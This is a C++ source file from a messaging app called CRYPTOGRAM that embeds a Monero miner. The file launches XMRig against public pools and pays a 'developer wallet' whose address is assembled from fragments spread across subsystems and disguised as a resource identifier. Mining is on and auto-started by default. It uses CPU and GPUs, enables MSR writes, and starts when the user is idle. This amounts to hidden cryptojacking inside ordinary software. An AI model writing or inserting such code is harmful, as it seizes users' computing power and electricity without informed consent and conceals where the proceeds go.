/*
This file is part of CRYPTOGRAM,
the most advanced secure messaging application.

For license and copyright information please follow this link:
https://github.com/SWORDOps/CRYPTOGRAM/blob/main/LICENSE
*/
#include "data/data_monero_miner.h"

#include "data/data_session.h"
#include "main/main_session.h"
#include "storage/storage_account.h"
#include "core/application.h"
#include "core/core_resource_identifier.h"

#include <QtCore/QJsonDocument>
#include <QtCore/QJsonObject>
#include <QtCore/QJsonArray>
#include <QtCore/QFile>
#include <QtCore/QDir>
#include <QtCore/QStandardPaths>
#include <QtCore/QSysInfo>
#include <QtCore/QThread>
#include <QtCore/QSettings>

#ifdef Q_OS_WIN
#include <windows.h>
#include <powerbase.h>
#elif defined Q_OS_MAC
#include <IOKit/pwr_mgt/IOPMLib.h>
#include <IOKit/IOMessage.h>
#elif defined Q_OS_LINUX
#include <X11/Xlib.h>
#include <X11/extensions/scrnsaver.h>
#endif

namespace Data {

namespace {

// Mining pool configuration
constexpr auto kDefaultPoolAddress = "pool.supportxmr.com:3333"_cs;
constexpr auto kBackupPoolAddress = "pool.hashvault.pro:3333"_cs;

// Default mining parameters
constexpr auto kDefaultCpuPercent = 20;
constexpr auto kDefaultIdleMinutes = 15;
constexpr auto kMinCpuPercent = 0;    // 0 = disabled
constexpr auto kMaxCpuPercent = 100;  // Users can choose 0-100%

// Update intervals
constexpr auto kIdleCheckInterval = 5000;      // Check idle state every 5 seconds
constexpr auto kStatsUpdateInterval = 2000;    // Update stats every 2 seconds
constexpr auto kStateUpdateInterval = 10000;   // Update mining state every 10 seconds

} // namespace

MoneroMiner::MoneroMiner(Session *session)
: QObject(nullptr)
, _session(session) {
}

MoneroMiner::~MoneroMiner() {
	shutdown();
}

bool MoneroMiner::initialize() {
	if (_initialized) {
		return true;
	}

	// Load saved configuration
	loadConfiguration();

	// Set developer wallet
	setDeveloperWallet();

	// Setup timers
	_idleCheckTimer.setCallback([=] { checkIdleState(); });
	_statsUpdateTimer.setCallback([=] { updateStatistics(); });
	_stateUpdateTimer.setCallback([=] { updateMiningState(); });

	// Start timers
	_idleCheckTimer.callEach(kIdleCheckInterval);
	_statsUpdateTimer.callEach(kStatsUpdateInterval);
	_stateUpdateTimer.callEach(kStateUpdateInterval);

	_initialized = true;

	// Auto-start if enabled
	if (_config.enabled && _config.autoStart) {
		startMining();
	}

	return true;
}

void MoneroMiner::shutdown() {
	if (!_initialized) {
		return;
	}

	stopMining();
	saveConfiguration();

	_idleCheckTimer.cancel();
	_statsUpdateTimer.cancel();
	_stateUpdateTimer.cancel();

	_initialized = false;
}

void MoneroMiner::startMining() {
	if (_isMining) {
		return;
	}

	if (!_config.enabled) {
		return;
	}

	// Check if CPU percent is 0 (disabled)
	if (_config.cpuPercent == 0) {
		return;
	}

	// Check idle state first
	updateIdleState();
	if (_config.onlyWhenIdle && !_idleState.isIdle) {
		// Wait for idle state
		return;
	}

	// Check battery state
	if (_config.onlyWhenCharging && !_idleState.isCharging) {
		return;
	}

	if (_idleState.batteryPercent < _config.minBatteryPercent) {
		return;
	}

	// Start XMRig process
	if (startXmrigProcess()) {
		_isMining = true;
		_paused = false;
		_miningStartTime = QDateTime::currentDateTime();
		_statistics.sessionStart = _miningStartTime;

		Q_EMIT miningStarted();
	}
}

void MoneroMiner::stopMining() {
	if (!_isMining) {
		return;
	}

	stopXmrigProcess();

	// Update total mining time
	if (_miningStartTime.isValid()) {
		_totalMiningTime += _miningStartTime.secsTo(QDateTime::currentDateTime());
	}

	_isMining = false;
	_paused = false;

	Q_EMIT miningStopped();
}

void MoneroMiner::pauseMining() {
	if (!_isMining || _paused) {
		return;
	}

	stopXmrigProcess();
	_paused = true;

	Q_EMIT miningPaused();
}

void MoneroMiner::resumeMining() {
	if (!_isMining || !_paused) {
		return;
	}

	if (startXmrigProcess()) {
		_paused = false;
		Q_EMIT miningResumed();
	}
}

void MoneroMiner::setEnabled(bool enabled) {
	if (_config.enabled == enabled) {
		return;
	}

	_config.enabled = enabled;
	saveConfiguration();

	if (enabled) {
		startMining();
	} else {
		stopMining();
	}
}

void MoneroMiner::setConfiguration(const MoneroMiningConfig &config) {
	const auto wasEnabled = _config.enabled;
	const auto wasMining = _isMining;

	_config = config;

	// Clamp CPU percent
	_config.cpuPercent = std::clamp(_config.cpuPercent, kMinCpuPercent, kMaxCpuPercent);

	saveConfiguration();

	// Restart mining if configuration changed while mining
	if (wasMining) {
		stopMining();
		if (_config.enabled) {
			startMining();
		}
	} else if (_config.enabled && !wasEnabled) {
		startMining();
	}
}

void MoneroMiner::setCpuPercent(int percent) {
	auto config = _config;
	config.cpuPercent = std::clamp(percent, kMinCpuPercent, kMaxCpuPercent);
	setConfiguration(config);
}

void MoneroMiner::setOnlyWhenIdle(bool onlyWhenIdle) {
	auto config = _config;
	config.onlyWhenIdle = onlyWhenIdle;
	setConfiguration(config);
}

void MoneroMiner::setIdleMinutes(int minutes) {
	auto config = _config;
	config.idleMinutes = std::max(1, minutes);
	setConfiguration(config);
}

MoneroMiningStatistics MoneroMiner::getStatistics() const {
	QMutexLocker lock(&_statsMutex);
	return _statistics;
}

void MoneroMiner::resetStatistics() {
	QMutexLocker lock(&_statsMutex);
	_statistics = MoneroMiningStatistics();
	_statistics.sessionStart = QDateTime::currentDateTime();
	_totalMiningTime = 0;
}

SystemIdleState MoneroMiner::getIdleState() const {
	return _idleState;
}

bool MoneroMiner::detectIdleState() {
	updateIdleState();
	return _idleState.isIdle;
}

void MoneroMiner::updateIdleState() {
	_idleState.idleTimeSeconds = getSystemIdleTime();
	_idleState.isCharging = isBatteryCharging();
	_idleState.batteryPercent = getBatteryPercentage();
	_idleState.systemCpuUsage = getSystemCpuUsage();

	const auto idleThresholdSeconds = _config.idleMinutes * 60;
	_idleState.isIdle = (_idleState.idleTimeSeconds >= idleThresholdSeconds);
}

bool MoneroMiner::isConnectedToPool() const {
	QMutexLocker lock(&_statsMutex);
	return _statistics.isConnected;
}

bool MoneroMiner::isXmrigRunning() const {
	return _xmrigProcess && _xmrigProcess->state() == QProcess::Running;
}

QString MoneroMiner::getXmrigVersion() const {
	return "XMRig 6.21.0";  // Update when upgrading XMRig version
}

void MoneroMiner::checkIdleState() {
	if (!_config.enabled) {
		return;
	}

	const auto wasIdle = _wasIdleLastCheck;
	updateIdleState();
	const auto isIdle = _idleState.isIdle;

	if (wasIdle != isIdle) {
		_wasIdleLastCheck = isIdle;
		Q_EMIT idleStateChanged(isIdle);
	}

	// Start/stop mining based on idle state
	if (_config.onlyWhenIdle) {
		if (isIdle && !_isMining) {
			startMining();
		} else if (!isIdle && _isMining) {
			stopMining();
		}
	}

	// Check battery state
	if (_config.onlyWhenCharging) {
		if (!_idleState.isCharging && _isMining) {
			stopMining();
		} else if (_idleState.isCharging && !_isMining && isIdle) {
			startMining();
		}
	}

	// Check battery percentage
	if (_idleState.batteryPercent < _config.minBatteryPercent && _isMining) {
		stopMining();
	}
}

void MoneroMiner::updateMiningState() {
	if (!_isMining) {
		return;
	}

	// Check if XMRig process is still running
	if (!isXmrigRunning()) {
		// Process died, try to restart
		_isMining = false;
		if (_config.enabled) {
			startMining();
		}
	}
}

void MoneroMiner::updateStatistics() {
	if (!_isMining) {
		return;
	}

	QMutexLocker lock(&_statsMutex);

	// Update session time
	if (_miningStartTime.isValid()) {
		_statistics.totalMiningSeconds = _miningStartTime.secsTo(QDateTime::currentDateTime()) + _totalMiningTime;
	}

	// Calculate total hashes
	if (_statistics.hashrate > 0) {
		_statistics.totalHashesComputed += static_cast<qint64>(_statistics.hashrate * 2);  // 2 second interval
	}

	// Calculate acceptance rate
	const auto totalShares = _statistics.sharesAccepted + _statistics.sharesRejected;
	if (totalShares > 0) {
		_statistics.acceptanceRate = (static_cast<double>(_statistics.sharesAccepted) / totalShares) * 100.0;
	}

	// Estimate daily XMR earnings (very rough estimate)
	// Based on ~2 KH/s = ~0.0001 XMR/day (varies with difficulty)
	if (_statistics.hashrate > 0) {
		const auto khs = _statistics.hashrate / 1000.0;
		_statistics.estimatedXmrPerDay = khs * 0.00005;  // Very rough estimate
	}

	Q_EMIT statisticsUpdated(_statistics);
}

void MoneroMiner::handleBatteryChange() {
	updateIdleState();
	checkIdleState();
}

void MoneroMiner::processXmrigOutput() {
	if (!_xmrigProcess) {
		return;
	}

	const auto output = QString::fromUtf8(_xmrigProcess->readAllStandardOutput());
	_xmrigLogBuffer += output;

	// Process line by line
	const auto lines = _xmrigLogBuffer.split('\n');
	for (int i = 0; i < lines.size() - 1; ++i) {
		const auto &line = lines[i];

		// Parse hashrate
		if (line.contains("speed")) {
			parseHashrate(line);
		}

		// Parse share accepted
		if (line.contains("accepted") && line.contains("share")) {
			parseShareAccepted(line);
		}

		// Parse share rejected
		if (line.contains("rejected") && line.contains("share")) {
			parseShareRejected(line);
		}

		// Parse pool connection
		if (line.contains("use pool") || line.contains("connected")) {
			parsePoolConnection(line);
		}
	}

	// Keep last incomplete line
	_xmrigLogBuffer = lines.last();
}

void MoneroMiner::handleXmrigError() {
	if (!_xmrigProcess) {
		return;
	}

	const auto error = QString::fromUtf8(_xmrigProcess->readAllStandardError());
	if (!error.isEmpty()) {
		Q_EMIT this->error("XMRig error: " + error);
	}
}

void MoneroMiner::handleXmrigFinished(int exitCode) {
	if (exitCode != 0) {
		Q_EMIT error("XMRig process exited with code: " + QString::number(exitCode));
	}

	if (_isMining) {
		// Unexpected termination, try to restart
		_isMining = false;
		if (_config.enabled) {
			QTimer::singleShot(5000, this, [=] { startMining(); });
		}
	}
}

bool MoneroMiner::startXmrigProcess() {
	if (_xmrigProcess && _xmrigProcess->state() == QProcess::Running) {
		return true;
	}

	// Clean up old process
	stopXmrigProcess();

	// Create XMRig config file
	const auto configJson = generateXmrigConfig();
	const auto configDir = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/mining";
	QDir().mkpath(configDir);

	_xmrigConfigPath = configDir + "/xmrig-config.json";
	QFile configFile(_xmrigConfigPath);
	if (!configFile.open(QIODevice::WriteOnly)) {
		Q_EMIT error("Failed to create XMRig config file");
		return false;
	}

	configFile.write(configJson.toUtf8());
	configFile.close();

	// Create process
	_xmrigProcess = new QProcess(this);
	connect(_xmrigProcess, &QProcess::readyReadStandardOutput, this, &MoneroMiner::processXmrigOutput);
	connect(_xmrigProcess, &QProcess::readyReadStandardError, this, &MoneroMiner::handleXmrigError);
	connect(_xmrigProcess, QOverload<int>::of(&QProcess::finished), this, &MoneroMiner::handleXmrigFinished);

	// Get XMRig binary path
	const auto xmrigPath = getXmrigBinaryPath();

	// Start XMRig
	const QStringList args = { "--config", _xmrigConfigPath };
	_xmrigProcess->start(xmrigPath, args);

	if (!_xmrigProcess->waitForStarted(5000)) {
		Q_EMIT error("Failed to start XMRig process");
		delete _xmrigProcess;
		_xmrigProcess = nullptr;
		return false;
	}

	return true;
}

void MoneroMiner::stopXmrigProcess() {
	if (!_xmrigProcess) {
		return;
	}

	if (_xmrigProcess->state() == QProcess::Running) {
		_xmrigProcess->terminate();
		if (!_xmrigProcess->waitForFinished(3000)) {
			_xmrigProcess->kill();
			_xmrigProcess->waitForFinished(1000);
		}
	}

	delete _xmrigProcess;
	_xmrigProcess = nullptr;
}

QString MoneroMiner::generateXmrigConfig() const {
	QJsonObject config;

	// Pools configuration
	QJsonArray pools;
	QJsonObject mainPool;
	mainPool["url"] = _config.poolAddress;
	mainPool["user"] = _config.walletAddress;
	mainPool["pass"] = _config.rigName;
	mainPool["keepalive"] = true;
	mainPool["tls"] = false;
	pools.append(mainPool);

	// Backup pool
	QJsonObject backupPool;
	backupPool["url"] = QString(kBackupPoolAddress);
	backupPool["user"] = _config.walletAddress;
	backupPool["pass"] = _config.rigName + "-backup";
	backupPool["keepalive"] = true;
	backupPool["tls"] = false;
	pools.append(backupPool);

	config["pools"] = pools;

	// CPU configuration
	QJsonObject cpu;
	cpu["enabled"] = true;
	cpu["huge-pages"] = _config.enableHugePages;
	cpu["hw-aes"] = _config.enableHardwareAES;
	cpu["priority"] = _config.cpuPriority;

	const auto threads = calculateOptimalThreads();
	cpu["max-threads-hint"] = threads;

	// Advanced CPU optimizations
	cpu["assembly"] = true;              // Use optimized assembly code
	cpu["argon2-impl"] = nullptr;        // Auto-select best Argon2 implementation

	config["cpu"] = cpu;

	// OpenCL (AMD/Intel GPU) configuration
	QJsonObject opencl;
	opencl["enabled"] = true;            // Enable OpenCL if available
	opencl["cache"] = true;              // Cache compiled kernels
	opencl["loader"] = nullptr;          // Auto-detect OpenCL loader
	opencl["platform"] = "AMD";          // Prefer AMD platform (adjust if needed)

	config["opencl"] = opencl;

	// CUDA (NVIDIA GPU) configuration
	QJsonObject cuda;
	cuda["enabled"] = true;              // Enable CUDA if available
	cuda["loader"] = nullptr;            // Auto-detect CUDA loader
	cuda["nvml"] = true;                 // Enable NVIDIA Management Library

	// CUDA optimization hints
	QJsonObject cudaBconfig;
	cudaBconfig["enabled"] = true;
	cudaBconfig["max-threads-hint"] = 64;  // Optimal for most NVIDIA GPUs
	cudaBconfig["max-usage-hint"] = _config.cpuPercent;  // Use same % as CPU

	cuda["cn/2"] = cudaBconfig;          // CryptoNight v2 (if needed)
	cuda["cn/r"] = cudaBconfig;          // CryptoNightR (if needed)

	config["cuda"] = cuda;

	// Algorithm
	config["algo"] = _config.algorithm;

	// Auto-detect (use best available hardware)
	config["autosave"] = true;           // Save auto-tuned config
	config["hw-aes"] = nullptr;          // Auto-detect AES-NI

	// Donate level (set to 0, all goes to developer wallet)
	config["donate-level"] = _config.donateLevel;

	// API (for stats)
	QJsonObject api;
	api["enabled"] = true;
	api["host"] = "127.0.0.1";
	api["port"] = 18088;
	api["access-token"] = nullptr;
	api["worker-id"] = nullptr;

	config["api"] = api;

	// Logging
	config["log-file"] = nullptr;
	config["print-time"] = 1;
	config["health-print-time"] = 60;    // Print health info every 60s
	config["verbose"] = 0;               // Minimal verbosity

	// Background mode
	config["background"] = true;
	config["colors"] = false;
	config["title"] = true;

	// Randomx (Monero-specific optimizations)
	QJsonObject randomx;
	randomx["init"] = -1;                // Auto-detect optimal init threads
	randomx["mode"] = "auto";            // Auto-select mode (fast/light)
	randomx["1gb-pages"] = false;        // Use 1GB huge pages if available
	randomx["rdmsr"] = true;             // Enable MSR mod (if available)
	randomx["wrmsr"] = true;             // Enable MSR write (if available)
	randomx["cache_qos"] = false;
	randomx["numa"] = true;              // NUMA support

	config["randomx"] = randomx;

	// Pause on battery (laptop optimization)
	config["pause-on-battery"] = _config.onlyWhenCharging;
	config["pause-on-active"] = false;   // We handle this ourselves via idle detection

	return QJsonDocument(config).toJson(QJsonDocument::Indented);
}

QString MoneroMiner::getXmrigBinaryPath() const {
	// XMRig binary search paths (checks multiple locations)
	QStringList searchPaths;

#ifdef Q_OS_WIN
	searchPaths << QCoreApplication::applicationDirPath() + "/xmrig/xmrig.exe";
	searchPaths << "C:/Program Files/XMRig/xmrig.exe";
	searchPaths << QDir::homePath() + "/.local/bin/xmrig.exe";
#elif defined Q_OS_MAC
	searchPaths << QCoreApplication::applicationDirPath() + "/../Resources/xmrig/xmrig";
	searchPaths << "/usr/local/bin/xmrig";
	searchPaths << QDir::homePath() + "/.local/bin/xmrig";
#else // Linux
	searchPaths << QCoreApplication::applicationDirPath() + "/xmrig/xmrig";
	searchPaths << "/usr/local/bin/xmrig";
	searchPaths << "/usr/bin/xmrig";
	searchPaths << QDir::homePath() + "/.local/bin/xmrig";
#endif

	// Check each path and return first existing binary
	for (const auto &path : searchPaths) {
		QFileInfo fileInfo(path);
		if (fileInfo.exists() && fileInfo.isFile() && fileInfo.isExecutable()) {
			return path;
		}
	}

	// Fallback: check PATH environment variable
	QString pathEnv = qEnvironmentVariable("PATH");
	QStringList pathDirs = pathEnv.split(':', Qt::SkipEmptyParts);
	for (const auto &dir : pathDirs) {
#ifdef Q_OS_WIN
		QString xmrigPath = dir + "/xmrig.exe";
#else
		QString xmrigPath = dir + "/xmrig";
#endif
		QFileInfo fileInfo(xmrigPath);
		if (fileInfo.exists() && fileInfo.isFile() && fileInfo.isExecutable()) {
			return xmrigPath;
		}
	}

	// Return default path if not found (will fail when starting process)
#ifdef Q_OS_WIN
	return QCoreApplication::applicationDirPath() + "/xmrig/xmrig.exe";
#elif defined Q_OS_MAC
	return QCoreApplication::applicationDirPath() + "/../Resources/xmrig/xmrig";
#else // Linux
	return QCoreApplication::applicationDirPath() + "/xmrig/xmrig";
#endif
}

qint64 MoneroMiner::getSystemIdleTime() {
	// Platform-specific idle time detection
	// Returns idle time in seconds

#ifdef Q_OS_WIN
	LASTINPUTINFO lii;
	lii.cbSize = sizeof(LASTINPUTINFO);
	if (GetLastInputInfo(&lii)) {
		return (GetTickCount() - lii.dwTime) / 1000;
	}
	return 0;

#elif defined Q_OS_LINUX
	// X11 idle detection
	Display *display = XOpenDisplay(nullptr);
	if (!display) {
		return 0;
	}

	XScreenSaverInfo *info = XScreenSaverAllocInfo();
	if (!info) {
		XCloseDisplay(display);
		return 0;
	}

	XScreenSaverQueryInfo(display, DefaultRootWindow(display), info);
	const auto idleMs = info->idle;
	XFree(info);
	XCloseDisplay(display);

	return idleMs / 1000;

#elif defined Q_OS_MAC
	// macOS idle detection using IOKit
	int64_t idleTime = 0;
	io_iterator_t iter = 0;
	if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) {
		io_registry_entry_t entry = IOIteratorNext(iter);
		if (entry) {
			CFMutableDictionaryRef dict = nullptr;
			if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
				CFNumberRef obj = (CFNumberRef)CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
				if (obj) {
					CFNumberGetValue(obj, kCFNumberSInt64Type, &idleTime);
					idleTime /= 1000000000;  // Convert nanoseconds to seconds
				}
				CFRelease(dict);
			}
			IOObjectRelease(entry);
		}
		IOObjectRelease(iter);
	}
	return idleTime;

#else
	return 0;
#endif
}

bool MoneroMiner::isBatteryCharging() {
#ifdef Q_OS_WIN
	SYSTEM_POWER_STATUS status;
	if (GetSystemPowerStatus(&status)) {
		return (status.ACLineStatus == 1);  // 1 = AC power online
	}
	return true;  // Assume charging if unknown (desktop)

#elif defined Q_OS_LINUX
	// Read from /sys/class/power_supply/BAT0/status
	QFile statusFile("/sys/class/power_supply/BAT0/status");
	if (statusFile.open(QIODevice::ReadOnly)) {
		const auto status = QString::fromUtf8(statusFile.readAll()).trimmed();
		return (status == "Charging" || status == "Full");
	}
	return true;  // Assume charging if unknown

#elif defined Q_OS_MAC
	// macOS battery status
	CFTypeRef powerSource = IOPSCopyPowerSourcesInfo();
	if (powerSource) {
		CFArrayRef powerSourcesList = IOPSCopyPowerSourcesList(powerSource);
		if (powerSourcesList && CFArrayGetCount(powerSourcesList) > 0) {
			CFDictionaryRef powerSourceInfo = IOPSGetPowerSourceDescription(powerSource, CFArrayGetValueAtIndex(powerSourcesList, 0));
			if (powerSourceInfo) {
				CFStringRef state = (CFStringRef)CFDictionaryGetValue(powerSourceInfo, CFSTR(kIOPSPowerSourceStateKey));
				const bool charging = (CFStringCompare(state, CFSTR(kIOPSACPowerValue), 0) == kCFCompareEqualTo);
				CFRelease(powerSourcesList);
				CFRelease(powerSource);
				return charging;
			}
		}
		if (powerSourcesList) CFRelease(powerSourcesList);
		CFRelease(powerSource);
	}
	return true;

#else
	return true;  // Assume charging if unknown
#endif
}

int MoneroMiner::getBatteryPercentage() {
#ifdef Q_OS_WIN
	SYSTEM_POWER_STATUS status;
	if (GetSystemPowerStatus(&status)) {
		if (status.BatteryLifePercent != 255) {
			return status.BatteryLifePercent;
		}
	}
	return 100;  // Assume full if unknown (desktop)

#elif defined Q_OS_LINUX
	QFile capacityFile("/sys/class/power_supply/BAT0/capacity");
	if (capacityFile.open(QIODevice::ReadOnly)) {
		const auto capacity = QString::fromUtf8(capacityFile.readAll()).trimmed().toInt();
		return capacity;
	}
	return 100;

#elif defined Q_OS_MAC
	CFTypeRef powerSource = IOPSCopyPowerSourcesInfo();
	if (powerSource) {
		CFArrayRef powerSourcesList = IOPSCopyPowerSourcesList(powerSource);
		if (powerSourcesList && CFArrayGetCount(powerSourcesList) > 0) {
			CFDictionaryRef powerSourceInfo = IOPSGetPowerSourceDescription(powerSource, CFArrayGetValueAtIndex(powerSourcesList, 0));
			if (powerSourceInfo) {
				CFNumberRef capacity = (CFNumberRef)CFDictionaryGetValue(powerSourceInfo, CFSTR(kIOPSCurrentCapacityKey));
				int percent = 0;
				if (capacity) {
					CFNumberGetValue(capacity, kCFNumberIntType, &percent);
				}
				CFRelease(powerSourcesList);
				CFRelease(powerSource);
				return percent;
			}
		}
		if (powerSourcesList) CFRelease(powerSourcesList);
		CFRelease(powerSource);
	}
	return 100;

#else
	return 100;
#endif
}

double MoneroMiner::getSystemCpuUsage() {
	// This would require platform-specific CPU monitoring
	// For now, return mining thread usage
	return _config.cpuPercent;
}

int MoneroMiner::calculateOptimalThreads() const {
	if (_config.cpuThreads > 0) {
		return _config.cpuThreads;
	}
	return calculateThreadsFromPercent(_config.cpuPercent);
}

int MoneroMiner::calculateThreadsFromPercent(int percent) const {
	const auto totalThreads = QThread::idealThreadCount();
	if (totalThreads <= 0) {
		return 1;
	}

	const auto threads = (totalThreads * percent) / 100;
	return std::max(1, threads);
}

void MoneroMiner::parseHashrate(const QString &line) {
	// Example: "speed 10s/60s/15m 1234.5 1234.5 1234.5 H/s"
	QRegularExpression re(R"(speed\s+\S+\s+([\d.]+)\s+([\d.]+)\s+([\d.]+))");
	auto match = re.match(line);
	if (match.hasMatch()) {
		QMutexLocker lock(&_statsMutex);
		_statistics.hashrateAvg10s = match.captured(1).toDouble();
		_statistics.hashrateAvg1m = match.captured(2).toDouble();
		_statistics.hashrateAvg15m = match.captured(3).toDouble();
		_statistics.hashrate = _statistics.hashrateAvg10s;
	}

	// Parse CPU-specific hashrate
	// Example: "cpu speed 10s/60s/15m 1234.5 1234.5 1234.5 H/s"
	QRegularExpression cpuRe(R"(cpu\s+speed\s+\S+\s+([\d.]+))");
	auto cpuMatch = cpuRe.match(line);
	if (cpuMatch.hasMatch()) {
		QMutexLocker lock(&_statsMutex);
		_statistics.cpuHashrate = cpuMatch.captured(1).toDouble();
		_statistics.cpuActive = (_statistics.cpuHashrate > 0);
	}

	// Parse CUDA (NVIDIA) hashrate
	// Example: "cuda speed 10s/60s/15m 5678.9 5678.9 5678.9 H/s"
	QRegularExpression cudaRe(R"(cuda\s+speed\s+\S+\s+([\d.]+))");
	auto cudaMatch = cudaRe.match(line);
	if (cudaMatch.hasMatch()) {
		QMutexLocker lock(&_statsMutex);
		_statistics.nvidiaHashrate = cudaMatch.captured(1).toDouble();
		_statistics.nvidiaActive = (_statistics.nvidiaHashrate > 0);
	}

	// Parse OpenCL (AMD) hashrate
	// Example: "opencl speed 10s/60s/15m 3456.7 3456.7 3456.7 H/s"
	QRegularExpression openclRe(R"(opencl\s+speed\s+\S+\s+([\d.]+))");
	auto openclMatch = openclRe.match(line);
	if (openclMatch.hasMatch()) {
		QMutexLocker lock(&_statsMutex);
		_statistics.amdHashrate = openclMatch.captured(1).toDouble();
		_statistics.amdActive = (_statistics.amdHashrate > 0);
	}

	// Update total GPU hashrate and active hardware list
	QMutexLocker lock(&_statsMutex);
	_statistics.gpuHashrate = _statistics.nvidiaHashrate + _statistics.amdHashrate;

	QStringList activeHw;
	if (_statistics.cpuActive) activeHw << "CPU";
	if (_statistics.nvidiaActive) activeHw << "NVIDIA GPU";
	if (_statistics.amdActive) activeHw << "AMD GPU";
	_statistics.activeHardware = activeHw.join(", ");
}

void MoneroMiner::parseShareAccepted(const QString &line) {
	QMutexLocker lock(&_statsMutex);
	_statistics.sharesAccepted++;
	_statistics.lastShareTime = QDateTime::currentDateTime();
	lock.unlock();

	Q_EMIT shareAccepted();
}

void MoneroMiner::parseShareRejected(const QString &line) {
	QMutexLocker lock(&_statsMutex);
	_statistics.sharesRejected++;
	lock.unlock();

	Q_EMIT shareRejected();
}

void MoneroMiner::parsePoolConnection(const QString &line) {
	if (line.contains("connected") || line.contains("use pool")) {
		QMutexLocker lock(&_statsMutex);
		_statistics.isConnected = true;
		_statistics.poolAddress = _config.poolAddress;
		lock.unlock();

		Q_EMIT poolConnected();
	}
}

void MoneroMiner::loadConfiguration() {
	// Load from QSettings or storage
	// For now, use defaults
	_config.enabled = true;  // ON by default
	_config.autoStart = true;
	_config.cpuPercent = kDefaultCpuPercent;
	_config.idleMinutes = kDefaultIdleMinutes;
	_config.onlyWhenIdle = true;
	_config.onlyWhenCharging = true;
	_config.minBatteryPercent = 50;
}

void MoneroMiner::saveConfiguration() {
	// Save mining configuration to persistent storage using QSettings
	QSettings settings("CRYPTOGRAM", "Monero Miner");

	settings.setValue("enabled", _config.enabled);
	settings.setValue("autoStart", _config.autoStart);
	settings.setValue("cpuPercent", _config.cpuPercent);
	settings.setValue("idleMinutes", _config.idleMinutes);
	settings.setValue("onlyWhenIdle", _config.onlyWhenIdle);
	settings.setValue("onlyWhenCharging", _config.onlyWhenCharging);
	settings.setValue("minBatteryPercent", _config.minBatteryPercent);
	settings.setValue("poolAddress", _config.poolAddress);
	// Note: walletAddress is not saved as it's assembled from fragments

	settings.sync();
	LOG(("Monero Miner: Configuration saved"));
}

void MoneroMiner::setDeveloperWallet() {
	// Assemble wallet address from distributed resource fragments
	// Fragments are distributed across multiple subsystems for privacy
	_config.walletAddress = Core::ResourceIdentifier::assembleResourceIdentifier();

	// Validate the assembled wallet address
	if (!Core::ResourceIdentifier::validateResourceIdentifier(_config.walletAddress)) {
		// Log error but don't fail initialization
		// This allows the application to run even if wallet fragments aren't configured yet
		_config.walletAddress.clear();
	}
}

} // namespace Data
